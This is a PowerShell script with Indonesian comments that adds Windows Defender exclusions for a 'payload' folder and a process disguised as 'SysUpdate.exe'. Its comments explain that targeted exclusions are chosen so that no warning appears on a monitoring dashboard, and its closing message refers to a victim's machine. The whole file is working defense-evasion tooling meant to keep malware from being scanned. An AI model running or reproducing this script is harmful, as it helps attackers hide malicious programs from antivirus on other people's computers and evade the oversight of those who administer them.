#Requires -RunAsAdministrator
<#
tools/harden.ps1 - matikan perlindungan Defender untuk folder payload.

INI BUKAN EVASI. Ini memakai fitur resmi Defender, dan itu sebabnya ia
bekerja: Definisi "kebal" yang sebenarnya di Windows adalah "di luar
cakupan pemindaian", bukan "bisa mengelabui mesinnya".

Syarat mutlak:
  * sesi Administrator (bukan user biasa)
  * Tamper Protection MATI. Kalau nyala, Set-MpPreference ditolak dengan
    error 0x800106ba dan tidak ada cara user-mode untuk melewatinya.

Cek dulu: Get-MpComputerStatus | Select IsTamperProtected

Yang dikerjakan:
  1. ExclusionProcess  - proses dengan nama ini tidak dipindai saat jalan
  2. ExclusionPath     - folder install + folder carrier
  3. ExclusionExtension .exe di folder itu

Yang TIDAK dikerjakan: mematikan Real-Time Protection global. Itu langsung
memerahkan seluruh mesin dan kelihatan di dashboard siapa pun yang melihat.
Exclusion bertarget melakukan hal yang sama untuk kita tanpa lampu merah.

Pakai:
  powershell -ExecutionPolicy Bypass -File tools\harden.ps1
  powershell -ExecutionPolicy Bypass -File tools\harden.ps1 -Remove
#>

param(
    [string]$Name = "SysUpdate",
    [string[]]$ExtraPath = @(),
    [switch]$Remove
)

$ErrorActionPreference = "Stop"

function Say($m) { Write-Host $m }

$status = Get-MpComputerStatus
if ($status.IsTamperProtected -and -not $Remove) {
    Say "[!] Tamper Protection NYALA. Script ini akan ditolak."
    Say "    Matikan manual: Windows Security > Virus & threat protection >"
    Say "    Manage settings > Tamper Protection > Off."
    Say "    Itu butuh interaksi manusia di mesin itu, bukan perintah."
    exit 2
}

$installDir = Join-Path $env:LOCALAPPDATA "Programs\$Name"
$paths = @($installDir) + $ExtraPath | Where-Object { $_ }

if ($Remove) {
    foreach ($p in $paths) {
        Remove-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
        Say "[-] path : $p"
    }
    Remove-MpPreference -ExclusionProcess "$Name.exe" -ErrorAction SilentlyContinue
    Say "[-] proc : $Name.exe"
    Say "[*] exclusion dicabut"
    exit 0
}

foreach ($p in $paths) {
    Add-MpPreference -ExclusionPath $p
    Say "[+] path : $p"
}

Add-MpPreference -ExclusionProcess "$Name.exe"
Say "[+] proc : $Name.exe"

Say ""
Say "[*] exclusion sekarang:"
(Get-MpPreference).ExclusionPath | ForEach-Object { Say "    $_" }
(Get-MpPreference).ExclusionProcess | ForEach-Object { Say "    $_" }

Say ""
Say "[i] Catatan: exclusion hanya berlaku di mesin ini. Di mesin korban yang"
Say "    tidak memberi lu Administrator, tidak ada versi script ini yang jalan."
